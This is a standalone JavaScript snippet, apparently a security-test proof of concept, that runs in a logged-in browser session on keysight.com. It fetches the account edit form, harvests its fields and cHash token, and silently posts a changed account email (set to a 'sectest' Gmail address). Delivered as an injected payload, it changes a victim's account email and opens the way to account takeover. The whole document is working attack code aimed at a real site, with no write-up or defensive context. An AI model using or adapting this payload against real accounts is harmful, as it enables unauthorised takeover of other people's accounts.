(async () => {
  const newEmail = "sectest29@gmail.com";
  const editUrl = "https://www.keysight.com/used/in/en/your-account/account-details/edit";

  const resp = await fetch(editUrl, { credentials: 'include' });
  if (!resp.ok) { console.error('GET failed', resp.status); return; }
  const html = await resp.text();
  const doc = new DOMParser().parseFromString(html, 'text/html');

  const form = Array.from(doc.querySelectorAll('form')).find(f => {
    const a = f.getAttribute('action') || '';
    return a.includes('tx_femanager_pi1%5Baction%5D=update') || a.includes('tx_femanager_pi1[action]=update');
  });
  if (!form) { console.error('Form not found'); return; }

  const actionUrl = new URL(form.getAttribute('action'), editUrl);
  const cHash = actionUrl.searchParams.get('cHash');
  console.log('cHash:', cHash);

  // Collect fields
  const pairs = [];
  const add = (n,v) => (n!=null) && pairs.push([n, v ?? '']);
  form.querySelectorAll('input').forEach(i=>{
    if(!i.name) return;
    const t=(i.type||'').toLowerCase();
    if(['checkbox','radio'].includes(t)) {
      if(i.checked) add(i.name, i.value || 'on');
    } else add(i.name, i.value || '');
  });
  form.querySelectorAll('select').forEach(s=>{
    if(!s.name) return;
    const sel = s.selectedOptions[0];
    add(s.name, sel ? sel.value : '');
  });
  form.querySelectorAll('textarea').forEach(t=>{
    if(t.name) add(t.name, t.value);
  });

  // Replace email
  const emailEntry = pairs.find(p => /\[email\]$/i.test(p[0]) || p[0].toLowerCase()==='email');
  if(!emailEntry){ console.error('Email field not found'); return; }
  console.log('Original email:', emailEntry[1]);
  emailEntry[1] = newEmail;

  const body = pairs.map(([k,v])=>encodeURIComponent(k)+'='+encodeURIComponent(v)).join('&');

  const post = await fetch(actionUrl.toString(), {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type':'application/x-www-form-urlencoded'},
    body
  });
  console.log('POST status:', post.status, post.statusText);
  const snippet = (await post.text()).slice(0,300);
  console.log('Response snippet:', snippet);
})();
